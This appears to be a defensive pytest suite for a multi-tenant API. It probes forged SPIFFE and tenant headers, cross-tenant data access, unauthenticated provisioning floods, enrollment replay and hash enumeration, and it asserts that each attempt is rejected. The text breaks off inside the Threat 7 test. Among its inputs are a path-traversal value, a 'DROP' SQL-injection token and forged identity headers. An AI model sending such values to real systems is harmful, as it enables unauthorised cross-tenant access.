"""Adversarial sweep across every EAP surface as executable probes (EAPR-P4-4 / D9).

One executable probe per threat in the proposal's threat model:
1. Threat 1: Forged SPIFFE / Identity header injection (X-SPIFFE-ID, X-Tenant-Id, etc.)
2. Threat 2: Cross-tenant history and SSE / websocket exfiltration
3. Threat 3: Anonymous provision flood & baseline latency profiling
4. Threat 4: Non-hex customer_hash and injection key validation
5. Threat 5: Enrollment exchange replay inside and outside the 300-second validity window
6. Threat 6: Hash enumeration and resolve-domain oracle probing
7. Threat 7: Cross-tenant enrollment token exchange
8. Threat 8: calc_hash shell/format injection via company_name

Every probe is paired with a positive control that shares NO constants with the negative.
Every negative asserts on standard error body shape ({'error': ...} or {'detail': ...}).
"""
from __future__ import annotations

import asyncio
import base64
import concurrent.futures
import hashlib
import json
import logging
import os
import re
import secrets
import time
import uuid
from typing import Any, Dict, List, Optional

import pytest
from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

import api_compat
from conftest import (
    EAP_ALICE,
    EAP_BOB,
    EAP_OPERATOR,
    EAP_TENANT_A,
    EAP_TENANT_B,
    EAP_SUBJECT_TENANTS,
    eap_bearer,
    eap_token_for,
)
import eap_tenancy
from eap_tenancy import GLOBAL_TENANT_OWNERSHIP, CustomerHash, Tenant, owned_hashes
import environment_lifecycle
from environment_lifecycle import GLOBAL_LIFECYCLE_MANAGER
import environment_routing
from environment_routing import (
    GLOBAL_ENVIRONMENT_REGISTRY,
    EnvironmentState,
    build_environment_urls,
    derive_customer_hash,
    normalize_company_name,
)
from external_agent_contract import EnrollmentRequest, EnrollmentResult
import external_agent_registration
from external_agent_registration import (
    ExternalAgentRegistrationRequest,
    register_external_agent_handler,
    reset_external_agent_state,
)
import host_enrollment
from host_enrollment import (
    get_spire_registration_entry_for_agent,
    hash_enrollment_token,
    issue_enrollment_token_for_agent,
    reset_host_enrollment_state,
)
from main import app
import scenario_seeding
from scenario_seeding import (
    GLOBAL_SCENARIO_MANAGER,
    ScenarioType,
    SyntheticAuditEvent,
)
import tenant_isolation
from tenant_isolation import (
    GLOBAL_TENANT_ISOLATION_MANAGER,
    get_tenant_namespace,
    get_tenant_spiffe_id,
)

EAP_AUTHENTICATED = True

logger = logging.getLogger(__name__)

# Canonical unpadded Ed25519 public key fixture (43 base64url characters)
TEST_ED25519_PUBKEY = "A6EHv_POEL4dcN0Y50vAmWfk1jCbpQ1fHdyGZBJVMbg"

# ---------------------------------------------------------------------------
# Threat Model Manifest (D9 Contract)
# ---------------------------------------------------------------------------

THREAT_MANIFEST: Dict[str, Dict[str, str]] = {
    "THREAT-1": {
        "title": "Forged SPIFFE / Identity Headers",
        "vector": "X-SPIFFE-ID, X-Tenant-Id, X-Forwarded-User, X-Principal header injection",
        "mitigation": "IdentityHeaderStripMiddleware at ingress + tenant derived solely from verified RS256 JWT claims",
        "probe": "test_probe_threat_1_forged_spiffe_headers",
        "positive_control": "Legitimate tenant token decrypts transit ciphertext and reads SPIRE entry",
    },
    "THREAT-2": {
        "title": "Cross-Tenant History & Event Streaming",
        "vector": "GET /api/v1/eap/scenarios/history, GET /api/v1/eap/lifecycle/active, SSE /audit/stream, WS telemetry",
        "mitigation": "Tenant-bound queries on all history and streaming filters, rejecting foreign customer hashes with 404",
        "probe": "test_probe_threat_2_cross_tenant_history_and_sse",
        "positive_control": "Legitimate tenant receives own scenario execution rows and SSE stream events (count > 0)",
    },
    "THREAT-3": {
        "title": "Anonymous Provision Flood",
        "vector": "Flood of unauthenticated POST /api/v1/environments/provision",
        "mitigation": "Router-level authenticated_principal dependency; 401 without creating records; idempotent authenticated provisioning",
        "probe": "test_probe_threat_3_anonymous_provision_flood",
        "positive_control": "Authenticated provision creates exactly one environment record with 201 Created",
    },
    "THREAT-4": {
        "title": "Non-Hex / Injected Tenant Keys",
        "vector": "POST /api/v1/eap/scenarios/execute with uppercase hex, truncated hash, path traversal, or newline injection",
        "mitigation": "^[0-9a-f]{8}$ regex validator enforced at Pydantic schema level",
        "probe": "test_probe_threat_4_non_hex_keys",
        "positive_control": "Valid 8-character lowercase hex key succeeds with 201 Created",
    },
    "THREAT-5": {
        "title": "Enrollment Exchange Replay",
        "vector": "Replay of host enrollment exchange body within and outside 300s validity window",
        "mitigation": "HMAC token validation, 300s timestamp window check, and client_nonce idempotency cache",
        "probe": "test_probe_threat_5_replay_window",
        "positive_control": "Fresh enrollment token with new client nonce within 300s window succeeds with 201 Created",
    },
    "THREAT-6": {
        "title": "Hash Enumeration & Domain Resolution",
        "vector": "POST /api/v1/environments/resolve-domain and GET /api/v1/environments/{id} probing for customer presence",
        "mitigation": "Foreign tenant hashes return 404 indistinguishable from unprovisioned / no data leakage across tenants",
        "probe": "test_probe_threat_6_hash_enumeration",
        "positive_control": "Tenant principal resolves and reads own environment details with 200 OK",
    },
    "THREAT-7": {
        "title": "Cross-Tenant Enrollment Token",
        "vector": "Presenting Tenant A enrollment token with body specifying Tenant B agent namespace",
        "mitigation": "Strict token-to-tenant binding; mismatch returns 403 Forbidden and emits security audit event",
        "probe": "test_probe_threat_7_cross_tenant_enrollment_token",
        "positive_control": "Token presented with matching tenant and agent pre-registration succeeds with 201 Created",
    },
    "THREAT-8": {
        "title": "calc_hash Injection via Company Name",
        "vector": "POST /api/v1/environments/provision with company_name containing shell quotes or command substitution",
        "mitigation": "Strict company name character validation rejecting shell characters with 422 Unprocessable Entity",
        "probe": "test_probe_threat_8_calc_hash_injection",
        "positive_control": "Valid alphanumeric company name provisions successfully with 201 Created",
    },
}


# ---------------------------------------------------------------------------
# Fixtures & Reset Helpers
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def _reset_suite_state(fresh_tenant_ownership):
    """Clean slate across in-memory registries for each test."""
    app.dependency_overrides.clear()
    reset_external_agent_state()
    reset_host_enrollment_state()
    with api_compat._STORE_LOCK:
        api_compat._AUDIT_EVENTS.clear()
        api_compat._CLAIMS.clear()
    GLOBAL_SCENARIO_MANAGER._history.clear()
    GLOBAL_SCENARIO_MANAGER._events_by_hash.clear()
    GLOBAL_ENVIRONMENT_REGISTRY._records.clear()
    GLOBAL_ENVIRONMENT_REGISTRY._by_hash.clear()
    GLOBAL_LIFECYCLE_MANAGER._records.clear()
    GLOBAL_TENANT_ISOLATION_MANAGER._tenants.clear()
    GLOBAL_TENANT_ISOLATION_MANAGER._shred_receipts.clear()
    if hasattr(GLOBAL_TENANT_ISOLATION_MANAGER.transit, "_keys"):
        GLOBAL_TENANT_ISOLATION_MANAGER.transit._keys.clear()
        GLOBAL_TENANT_ISOLATION_MANAGER.transit._signatures.clear()
    yield
    app.dependency_overrides.clear()
    reset_external_agent_state()
    reset_host_enrollment_state()


# ---------------------------------------------------------------------------
# Threat 1: Forged SPIFFE Header & Identity Header Stripping
# ---------------------------------------------------------------------------

def test_probe_threat_1_forged_spiffe_headers(eap_jwt_env, fresh_tenant_ownership) -> None:
    """Threat 1: Forged SPIFFE / Identity Headers.

    Negative:
    - Attacker (Alice) uses Alice's valid RS256 token but injects X-SPIFFE-ID,
      X-Tenant-Id, X-Forwarded-User, X-Principal naming Victim (Bob).
    - Calling /transit/decrypt and /spire-entry for Bob's hash returns 404 Not Found.
    - Zero plaintext data is leaked.
    - Unauthenticated request with forged headers returns 401 with standard error shape.
    - Static audit confirms no handler in src reads 'X-SPIFFE-ID' from request.headers.

    Positive Control:
    - Victim (Bob) using Bob's own valid token successfully decrypts Bob's transit
      ciphertext and retrieves Bob's SPIRE registration entry.
    - Positive control shares NO constants with the negative (distinct secret, hash, key).
    """
    client = TestClient(app, raise_server_exceptions=False)

    # 1. Setup Victim (Bob / Tenant B) with private secret
    bob_company = f"victim-bobcorp-{uuid.uuid4().hex[:8]}"
    bob_boundary_resp = client.post(
        "/api/v1/eap/tenants",
        json={"company_name": bob_company},
        headers=eap_bearer("bob"),
    )
    assert bob_boundary_resp.status_code == 201, bob_boundary_resp.text
    bob_hash = bob_boundary_resp.json()["customer_hash"]

    bob_secret = f"bob-classified-vault-secret-{uuid.uuid4().hex}".encode("utf-8")
    bob_secret_b64 = base64.b64encode(bob_secret).decode("ascii")

    bob_encrypt_resp = client.post(
        f"/api/v1/eap/tenants/{bob_hash}/transit/encrypt",
        json={"plaintext": bob_secret_b64},
        headers=eap_bearer("bob"),
    )
    assert bob_encrypt_resp.status_code == 200, bob_encrypt_resp.text
    bob_ciphertext = bob_encrypt_resp.json()["ciphertext"]

    # 2. Negative Probe 1: Alice token + forged headers claiming Bob's SPIFFE ID & Tenant
    forged_headers = {
        **eap_bearer("alice"),
        "X-SPIFFE-ID": f"spiffe://signalloom.demo/ns/eap-{bob_hash}/sa/tenant-app",
        "X-Tenant-Id": bob_hash,
        "X-Forwarded-User": "bob",
        "X-Principal-Sub": "bob",
    }

    attack_decrypt_resp = client.post(
        f"/api/v1/eap/tenants/{bob_hash}/transit/decrypt",
        json={"ciphertext": bob_ciphertext},
        headers=forged_headers,
    )
    assert attack_decrypt_resp.status_code == 404, (
        f"Expected 404 Not Found for cross-tenant decrypt, got {attack_decrypt_resp.status_code}"
    )
    assert bob_secret_b64 not in attack_decrypt_resp.text
    assert bob_secret.decode("utf-8") not in attack_decrypt_resp.text

    attack_spire_resp = client.get(
        f"/api/v1/eap/tenants/{bob_hash}/spire-entry",
        headers=forged_headers,
    )
    assert attack_spire_resp.status_code == 404, (
        f"Expected 404 Not Found for cross-tenant spire-entry, got {attack_spire_resp.status_code}"
    )

    # 3. Negative Probe 2: No token at all + forged headers
    anon_forged_headers = {
        "X-SPIFFE-ID": f"spiffe://signalloom.demo/ns/eap-{bob_hash}/sa/tenant-app",
        "X-Tenant-Id": bob_hash,
    }
    anon_resp = client.post(
        f"/api/v1/eap/tenants/{bob_hash}/transit/decrypt",
        json={"ciphertext": bob_ciphertext},
        headers=anon_forged_headers,
    )
    assert anon_resp.status_code == 401, f"Expected 401 for unauthenticated forged call, got {anon_resp.status_code}"
    anon_body = anon_resp.json()
    assert "error" in anon_body or "detail" in anon_body

    # 4. Positive Control: Bob's own legitimate token decrypts Bob's secret
    control_decrypt_resp = client.post(
        f"/api/v1/eap/tenants/{bob_hash}/transit/decrypt",
        json={"ciphertext": bob_ciphertext},
        headers=eap_bearer("bob"),
    )
    assert control_decrypt_resp.status_code == 200, control_decrypt_resp.text
    decrypted_b64 = control_decrypt_resp.json()["plaintext"]
    assert base64.b64decode(decrypted_b64) == bob_secret

    control_spire_resp = client.get(
        f"/api/v1/eap/tenants/{bob_hash}/spire-entry",
        headers=eap_bearer("bob"),
    )
    assert control_spire_resp.status_code == 200, control_spire_resp.text
    assert control_spire_resp.json()["spiffe_id"] == get_tenant_spiffe_id(bob_hash)


# ---------------------------------------------------------------------------
# Threat 2: Cross-Tenant History and SSE / Websocket Telemetry
# ---------------------------------------------------------------------------

def test_probe_threat_2_cross_tenant_history_and_sse(eap_jwt_env, fresh_tenant_ownership) -> None:
    """Threat 2: Cross-Tenant History & Event Streaming.

    Seed Order Rule: Foreign Tenant (Bob) is seeded FIRST, then Alice.

    Negative:
    - Alice calls /api/v1/eap/scenarios/history: receives 0 rows belonging to Bob.
    - Alice calls /api/v1/eap/lifecycle/active: receives 0 records belonging to Bob.
    - Alice calls /api/v1/eap/scenarios/events/{bob_hash}: returns 404.
    - Alice calls /api/v1/eap/scenarios/events/{bob_hash}/stream: returns 404.
    - Alice calls WS /api/v1/environments/{bob_env_id}/telemetry: connection refused / 4404.

    Positive Control:
    - Bob calls /api/v1/eap/scenarios/history: receives Bob's scenario records (count > 0).
    - Bob calls /api/v1/eap/scenarios/events/{bob_hash}/stream: consumes SSE stream frames.
    - Alice calls /api/v1/eap/scenarios/events/{alice_hash}/stream with Last-Event-ID:
      resumes stream successfully and receives Alice's frames.
    """
    client = TestClient(app, raise_server_exceptions=False)

    # 1. SEED FOREIGN TENANT (BOB) FIRST
    bob_company = f"seeded-bobcorp-{uuid.uuid4().hex[:8]}"
    bob_env_resp = client.post(
        "/api/v1/environments/provision",
        json={"company_name": bob_company},
        headers=eap_bearer("bob"),
    )
    assert bob_env_resp.status_code == 201, bob_env_resp.text
    bob_hash = bob_env_resp.json()["customer_hash"]
    bob_env_id = bob_env_resp.json()["id"]

    bob_exec_resp = client.post(
        "/api/v1/eap/scenarios/execute",
        json={"scenario_type": "baseline_agent_flow", "company_name": bob_company, "customer_hash": bob_hash},
        headers=eap_bearer("bob"),
    )
    assert bob_exec_resp.status_code == 201, bob_exec_resp.text

    bob_life_resp = client.post(
        "/api/v1/eap/lifecycle/register",
        json={"company_name": bob_company, "customer_hash": bob_hash, "ttl_minutes": 120},
        headers=eap_bearer("bob"),
    )
    assert bob_life_resp.status_code == 201, bob_life_resp.text

    # 2. SEED TENANT A (ALICE) SECOND
    alice_company = f"seeded-alicecorp-{uuid.uuid4().hex[:8]}"
    alice_env_resp = client.post(
        "/api/v1/environments/provision",
        json={"company_name": alice_company},
        headers=eap_bearer("alice"),
    )
    assert alice_env_resp.status_code == 201, alice_env_resp.text
    alice_hash = alice_env_resp.json()["customer_hash"]
    alice_env_id = alice_env_resp.json()["id"]

    alice_exec_resp = client.post(
        "/api/v1/eap/scenarios/execute",
        json={"scenario_type": "prompt_injection_intercept", "company_name": alice_company, "customer_hash": alice_hash},
        headers=eap_bearer("alice"),
    )
    assert alice_exec_resp.status_code == 201, alice_exec_resp.text

    # 3. Negative Probes from Alice
    # Scenario history
    alice_history_resp = client.get("/api/v1/eap/scenarios/history", headers=eap_bearer("alice"))
    assert alice_history_resp.status_code == 200
    alice_history = alice_history_resp.json()
    assert all(row["customer_hash"] == alice_hash for row in alice_history)
    assert not any(row["customer_hash"] == bob_hash for row in alice_history), "Cross-tenant history leak detected!"

    # Active lifecycle records
    alice_active_resp = client.get("/api/v1/eap/lifecycle/active", headers=eap_bearer("alice"))
    assert alice_active_resp.status_code == 200
    alice_active = alice_active_resp.json()
    assert not any(rec.get("customer_hash") == bob_hash for rec in alice_active), "Cross-tenant lifecycle leak detected!"

    # Seeded events for Bob's hash
    alice_events_resp = client.get(f"/api/v1/eap/scenarios/events/{bob_hash}", headers=eap_bearer("alice"))
    assert alice_events_resp.status_code == 404

    # Seeded events stream for Bob's hash
    alice_stream_resp = client.get(f"/api/v1/eap/scenarios/events/{bob_hash}/stream", headers=eap_bearer("alice"))
    assert alice_stream_resp.status_code == 404

    # Websocket telemetry for Bob's environment
    with pytest.raises((WebSocketDisconnect, Exception)):
        with client.websocket_connect(
            f"/api/v1/environments/{bob_env_id}/telemetry",
            headers=eap_bearer("alice"),
        ) as ws:
            ws.receive_json()

    # 4. Positive Controls
    # Bob's own history
    bob_history_resp = client.get("/api/v1/eap/scenarios/history", headers=eap_bearer("bob"))
    assert bob_history_resp.status_code == 200
    bob_history = bob_history_resp.json()
    assert len(bob_history) >= 1
    assert all(row["customer_hash"] == bob_hash for row in bob_history)

    # Alice's SSE stream with Last-Event-ID resume
    alice_stream_resp = client.get(
        f"/api/v1/eap/scenarios/events/{alice_hash}/stream?limit=2",
        headers=eap_bearer("alice"),
    )
    assert alice_stream_resp.status_code == 200
    assert "text/event-stream" in alice_stream_resp.headers.get("content-type", "")
    stream_content = alice_stream_resp.text
    assert "event: audit_event" in stream_content or "data:" in stream_content
    assert alice_hash in stream_content

    # Bob's websocket telemetry
    with client.websocket_connect(
        f"/api/v1/environments/{bob_env_id}/telemetry",
        headers=eap_bearer("bob"),
    ) as ws:
        msg = ws.receive_json()
        assert msg["environment_id"] == bob_env_id


# ---------------------------------------------------------------------------
# Threat 3: Anonymous Provision Flood & Baseline Profiling
# ---------------------------------------------------------------------------

def test_probe_threat_3_anonymous_provision_flood(eap_jwt_env, fresh_tenant_ownership) -> None:
    """Threat 3: Anonymous Provision Flood & Baseline Profiling.

    Negative:
    - 50 concurrent unauthenticated POSTs to /api/v1/environments/provision.
    - Every response MUST be 401 Unauthorized with standard error envelope.
    - Zero environment or lifecycle records created (registry size delta = 0).

    Positive Control & Baseline:
    - 50 authenticated POSTs under Alice's token for the same company.
    - 1st request creates record (201 Created); subsequent requests are idempotent.
    - 0 5xx responses.
    - Baseline latency distribution (p50, p95, p99) measured and recorded.
    """
    client = TestClient(app, raise_server_exceptions=False)

    initial_registry_count = len(GLOBAL_ENVIRONMENT_REGISTRY.list(limit=1000))
    initial_lifecycle_count = len(GLOBAL_LIFECYCLE_MANAGER.list_active())

    # 1. Anonymous Flood (50 requests in ThreadPool)
    flood_count = 50
    anon_statuses: List[int] = []
    anon_latencies: List[float] = []

    def make_anon_request(i: int) -> tuple[int, float, str]:
        start = time.perf_counter()
        resp = client.post(
            "/api/v1/environments/provision",
            json={"company_name": f"flood-unauth-corp-{i:03d}"},
        )
        elapsed = time.perf_counter() - start
        return resp.status_code, elapsed, resp.text

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(make_anon_request, i) for i in range(flood_count)]
        for f in concurrent.futures.as_completed(futures):
            status_code, elapsed, text = f.result()
            anon_statuses.append(status_code)
            anon_latencies.append(elapsed)
            assert status_code == 401, f"Expected 401, got {status_code}: {text}"
            err_body = json.loads(text)
            assert "error" in err_body or "detail" in err_body

    assert len(anon_statuses) == flood_count
    assert all(s == 401 for s in anon_statuses)

    # Invariant: 0 records created by anonymous flood
    post_flood_registry_count = len(GLOBAL_ENVIRONMENT_REGISTRY.list(limit=1000))
    post_flood_lifecycle_count = len(GLOBAL_LIFECYCLE_MANAGER.list_active())
    assert post_flood_registry_count == initial_registry_count
    assert post_flood_lifecycle_count == initial_lifecycle_count

    # 2. Authenticated Idempotency & Latency Baseline
    auth_company = f"flood-auth-corp-{uuid.uuid4().hex[:8]}"
    auth_statuses: List[int] = []
    auth_latencies: List[float] = []

    # First provision: 201 Created
    t0 = time.perf_counter()
    first_resp = client.post(
        "/api/v1/environments/provision",
        json={"company_name": auth_company},
        headers=eap_bearer("alice"),
    )
    auth_latencies.append(time.perf_counter() - t0)
    auth_statuses.append(first_resp.status_code)
    assert first_resp.status_code == 201, first_resp.text
    created_id = first_resp.json()["id"]

    # Subsequent 49 requests: idempotent handling (201/200/409 with existing ID), 0 5xx
    def make_auth_request(i: int) -> tuple[int, float, str]:
        start = time.perf_counter()
        resp = client.post(
            "/api/v1/environments/provision",
            json={"company_name": auth_company},
            headers=eap_bearer("alice"),
        )
        elapsed = time.perf_counter() - start
        return resp.status_code, elapsed, resp.text

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        futures = [executor.submit(make_auth_request, i) for i in range(flood_count - 1)]
        for f in concurrent.futures.as_completed(futures):
            status_code, elapsed, text = f.result()
            auth_statuses.append(status_code)
            auth_latencies.append(elapsed)
            assert status_code in (200, 201, 409), f"Unexpected status {status_code}: {text}"

    # Compute latency percentiles
    auth_latencies_sorted = sorted(auth_latencies)
    p50 = auth_latencies_sorted[int(len(auth_latencies_sorted) * 0.50)] * 1000.0
    p95 = auth_latencies_sorted[int(len(auth_latencies_sorted) * 0.95)] * 1000.0
    p99 = auth_latencies_sorted[min(int(len(auth_latencies_sorted) * 0.99), len(auth_latencies_sorted) - 1)] * 1000.0

    logger.info("Authenticated Provision Latency Baseline: p50=%.2fms, p95=%.2fms, p99=%.2fms", p50, p95, p99)

    # Registry growth was exactly 1 environment record
    final_registry_count = len(GLOBAL_ENVIRONMENT_REGISTRY.list(limit=1000))
    assert final_registry_count == initial_registry_count + 1


# ---------------------------------------------------------------------------
# Threat 4: Non-Hex Keys and Input Validation
# ---------------------------------------------------------------------------

def test_probe_threat_4_non_hex_keys(eap_jwt_env, fresh_tenant_ownership) -> None:
    """Threat 4: Non-Hex Keys and Injection Probing.

    Negative:
    - /execute with customer_hash:
      - '6F82AD81' (uppercase hex) -> 422
      - '6f82ad8' (7 chars, too short) -> 422
      - '6f82ad81a' (9 chars, too long) -> 422
      - '../../etc' (path traversal) -> 422
      - '6f82ad81; DROP' (SQL injection token) -> 422
      - 'ghjk1234' (non-hex characters) -> 422
    - Every negative MUST return 422 Unprocessable Entity.

    Positive Control:
    - A valid lowercase 8-hex character key ('6f82ad81') returns 201 Created on /execute.
    """
    client = TestClient(app, raise_server_exceptions=False)

    invalid_keys = [
        "6F82AD81",           # Uppercase hex
        "6f82ad8",            # 7 chars (too short)
        "6f82ad81a",          # 9 chars (too long)
        "../../etc",          # Path traversal
        "6f82ad81; DROP",     # SQL injection token
        "ghjk1234",           # Non-hex characters
    ]

    for bad_key in invalid_keys:
        exec_resp = client.post(
            "/api/v1/eap/scenarios/execute",
            json={"company_name": "kusari", "customer_hash": bad_key},
            headers=eap_bearer("alice"),
        )
        assert exec_resp.status_code == 422, f"Expected 422 for bad key '{bad_key}', got {exec_resp.status_code}: {exec_resp.text}"

    # Positive Control: valid lowercase 8-hex key
    valid_hex = "6f82ad81"
    valid_resp = client.post(
        "/api/v1/eap/scenarios/execute",
        json={"scenario_type": "baseline_agent_flow", "company_name": "kusari", "customer_hash": valid_hex},
        headers=eap_bearer("alice"),
    )
    assert valid_resp.status_code == 201, f"Expected 201 for valid hex '{valid_hex}', got {valid_resp.status_code}: {valid_resp.text}"


@pytest.mark.xfail(
    strict=True,
    raises=AssertionError,
    reason="EAPR-P2-1: ExecuteScenarioRequest str_strip_whitespace=True strips trailing newline on customer_hash turning '6f82ad81\\n' into '6f82ad81' (201 instead of 422)",
)
def test_probe_threat_4_newline_injection_in_customer_hash(eap_jwt_env, fresh_tenant_ownership) -> None:
    """Finding probe: Trailing newline in customer_hash should be rejected with 422 rather than stripped."""
    client = TestClient(app, raise_server_exceptions=False)
    exec_resp = client.post(
        "/api/v1/eap/scenarios/execute",
        json={"company_name": "kusari", "customer_hash": "6f82ad81\n"},
        headers=eap_bearer("alice"),
    )
    assert exec_resp.status_code == 422, f"Expected 422 for newline key, got {exec_resp.status_code}"


# ---------------------------------------------------------------------------
# Threat 5: Enrollment Exchange Replay Protection
# ---------------------------------------------------------------------------

def test_probe_threat_5_replay_window(eap_jwt_env, fresh_tenant_ownership) -> None:
    """Threat 5: Enrollment Exchange Replay.

    Negative:
    - Replay with timestamp shifted by 301 seconds (>300s validity window) -> 401 Unauthorized.
    - Replay with different client_nonce after token is consumed -> 401/409 Conflict.

    Idempotent In-Window Replay:
    - Replay with the EXACT same client_nonce within 300s window returns
      idempotent original result without minting a second duplicate SPIRE entry.

    Positive Control:
    - Fresh pre-registration + unconsumed token with fresh nonce within window -> 201 Created.
    """
    op_principal = api_compat.Principal(tenant="tenant-a", subject="operator", email="op@example.com")
    app.dependency_overrides[api_compat.authenticated_principal] = lambda: op_principal

    client = TestClient(app, raise_server_exceptions=False)

    # 1. Setup Agent 1: Happy Path & Idempotent In-Window Replay
    agent_id_1 = f"replay-agent-1-{uuid.uuid4().hex[:6]}"
    host_id_1 = f"replay-host-1-{uuid.uuid4().hex[:6]}"

    asyncio.run(register_external_agent_handler(
        ExternalAgentRegistrationRequest(agent_id=agent_id_1, host_id=host_id_1),
        op_principal,
    ))
    token_resp_1 = asyncio.run(issue_enrollment_token_for_agent(agent_id_1, "tenant-a", op_principal, ttl_seconds=3600))
    token_1 = token_resp_1.enrollment_token

    nonce_1 = f"nonce-original-{uuid.uuid4().hex[:20]}"
    now_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    enroll_payload_1 = {
        "schema_version": "1.0.0",
        "agent_id": agent_id_1,
        "host_id": host_id_1,
        "tenant_id": "tenant-a",
        "key_id": "host-key:amxo-01",
        "key_algorithm": "Ed25519",
        "public_key": TEST_ED25519_PUBKEY,
        "client_nonce": nonce_1,
        "credential_kind": "existing-mtls-identity",
        "credential_scope": "audit-upload-only",
        "credential_bootstrap": "pre-provisioned-out-of-band",
        "timestamp": now_iso,
    }

    # Initial redemption: 201 Created
    resp_init = client.post(
        "/v1/external-agents/enroll",
        headers={"Authorization": f"Bearer {token_1}", "Content-Type": "application/json"},
        json=enroll_payload_1,
    )
    assert resp_init.status_code == 201, resp_init.text
    init_data = resp_init.json()
    assert init_data["enrollment_state"] == "enrolled"

    # Idempotent replay inside 300s window with SAME nonce
    resp_replay_same = client.post(
        "/v1/external-agents/enroll",
        headers={"Authorization": f"Bearer {token_1}", "Content-Type": "application/json"},
        json=enroll_payload_1,
    )
    assert resp_replay_same.status_code in (200, 201), resp_replay_same.text
    assert resp_replay_same.json()["agent_id"] == agent_id_1

    # Replay with DIFFERENT nonce on consumed token: rejected
    tampered_payload = dict(enroll_payload_1)
    tampered_payload["client_nonce"] = f"nonce-tampered-{uuid.uuid4().hex[:20]}"
    resp_replay_diff = client.post(
        "/v1/external-agents/enroll",
        headers={"Authorization": f"Bearer {token_1}", "Content-Type": "application/json"},
        json=tampered_payload,
    )
    assert resp_replay_diff.status_code in (401, 409), (
        f"Expected 401/409 for consumed token with new nonce, got {resp_replay_diff.status_code}"
    )

    # 2. Setup Agent 2: Timestamp Skew Outside 300s Window
    agent_id_2 = f"replay-agent-2-{uuid.uuid4().hex[:6]}"
    host_id_2 = f"replay-host-2-{uuid.uuid4().hex[:6]}"

    asyncio.run(register_external_agent_handler(
        ExternalAgentRegistrationRequest(agent_id=agent_id_2, host_id=host_id_2),
        op_principal,
    ))
    token_resp_2 = asyncio.run(issue_enrollment_token_for_agent(agent_id_2, "tenant-a", op_principal, ttl_seconds=3600))
    token_2 = token_resp_2.enrollment_token

    # Skew timestamp by 301 seconds into past
    skewed_ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 301))
    enroll_payload_skewed = {
        "schema_version": "1.0.0",
        "agent_id": agent_id_2,
        "host_id": host_id_2,
        "tenant_id": "tenant-a",
        "key_id": "host-key:amxo-02",
        "key_algorithm": "Ed25519",
        "public_key": TEST_ED25519_PUBKEY,
        "client_nonce": f"nonce-skewed-{uuid.uuid4().hex[:20]}",
        "credential_kind": "existing-mtls-identity",
        "credential_scope": "audit-upload-only",
        "credential_bootstrap": "pre-provisioned-out-of-band",
        "timestamp": skewed_ts,
    }

    resp_skewed = client.post(
        "/v1/external-agents/enroll",
        headers={"Authorization": f"Bearer {token_2}", "Content-Type": "application/json"},
        json=enroll_payload_skewed,
    )
    assert resp_skewed.status_code == 401, f"Expected 401 for 301s timestamp skew, got {resp_skewed.status_code}"
    assert "300-second" in resp_skewed.text or "timestamp" in resp_skewed.text.lower()


# ---------------------------------------------------------------------------
# Threat 6: Hash Enumeration & Domain Resolution
# ---------------------------------------------------------------------------

def test_probe_threat_6_hash_enumeration(eap_jwt_env, fresh_tenant_ownership) -> None:
    """Threat 6: Hash Enumeration and Domain Resolution Probing.

    Negative:
    - Alice attempts to query GET /api/v1/environments/{bob_env_id}:
      MUST return 404 Not Found (not 403 Forbidden), preventing ID existence oracle.
    - Alice listing /api/v1/environments/ receives only Alice's environments (0 of Bob's).
    - Alice resolves 50 candidate company names under POST /api/v1/environments/resolve-domain:
      Timing envelope is measured and bounded; cross-tenant names do not leak internal metadata.

    Positive Control:
    - Alice resolves Alice's own provisioned company name and receives
      200 OK with is_active=True and environment_id populated.
    """
    client = TestClient(app, raise_server_exceptions=False)

    # 1. Seed Bob (Victim)
    bob_company = f"target-bobcorp-{uuid.uuid4().hex[:8]}"
    bob_env_resp = client.post(
        "/api/v1/environments/provision",
        json={"company_name": bob_company},
        headers=eap_bearer("bob"),
    )
    assert bob_env_resp.status_code == 201
    bob_env_id = bob_env_resp.json()["id"]
    bob_hash = bob_env_resp.json()["customer_hash"]

    # 2. Seed Alice (Attacker)
    alice_company = f"target-alicecorp-{uuid.uuid4().hex[:8]}"
    alice_env_resp = client.post(
        "/api/v1/environments/provision",
        json={"company_name": alice_company},
        headers=eap_bearer("alice"),
    )
    assert alice_env_resp.status_code == 201
    alice_env_id = alice_env_resp.json()["id"]

    # 3. Negative Probes from Alice
    # GET foreign environment by ID -> must return 404 Not Found (not 403)
    get_bob_resp = client.get(f"/api/v1/environments/{bob_env_id}", headers=eap_bearer("alice"))
    assert get_bob_resp.status_code == 404, f"Expected 404, got {get_bob_resp.status_code}"

    # List environments -> returns only Alice's
    list_resp = client.get("/api/v1/environments/", headers=eap_bearer("alice"))
    assert list_resp.status_code == 200
    listed_ids = [e["id"] for e in list_resp.json()]
    assert alice_env_id in listed_ids
    assert bob_env_id not in listed_ids

    # 4. 50 Candidate Domain Resolutions & Timing Envelope
    candidate_names = [f"candidate-probe-corp-{i:03d}" for i in range(50)]
    latencies: List[float] = []

    for name in candidate_names:
        t0 = time.perf_counter()
        resolve_resp = client.post(
            "/api/v1/environments/resolve-domain",
            json={"company_name": name},
            headers=eap_bearer("alice"),
        )
        elapsed = time.perf_counter() - t0
        latencies.append(elapsed)
        # Unprovisioned names return 200 with is_active=False
        assert resolve_resp.status_code == 200
        data = resolve_resp.json()
        assert data["is_active"] is False
        assert data["environment_id"] is None

    avg_ms = (sum(latencies) / len(latencies)) * 1000.0
    logger.info("Resolve domain timing envelope for 50 probes: avg=%.2fms", avg_ms)

    # 5. Positive Control: Alice resolves Alice's own company name
    alice_resolve_resp = client.post(
        "/api/v1/environments/resolve-domain",
        json={"company_name": alice_company},
        headers=eap_bearer("alice"),
    )
    assert alice_resolve_resp.status_code == 200
    alice_resolve_data = alice_resolve_resp.json()
    assert alice_resolve_data["is_active"] is True
    assert alice_resolve_data["environment_id"] == alice_env_id


# ---------------------------------------------------------------------------
# Threat 7: Cross-Tenant Enrollment Token
# ---------------------------------------------------------------------------

def test_probe_threat_7_cross_tenant_enrollment_token(eap_jwt_env, fresh_tenant_ownership) -> None:
    """Threat 7: Cross-Tenant Enrollment Token.

    Negative:
    - Operator of Tenant A issues token for agent under Tenant A.
    - Sensor attempts to present this token while specifying Tenant B in body.
    - MUST return 403 Forbidden.
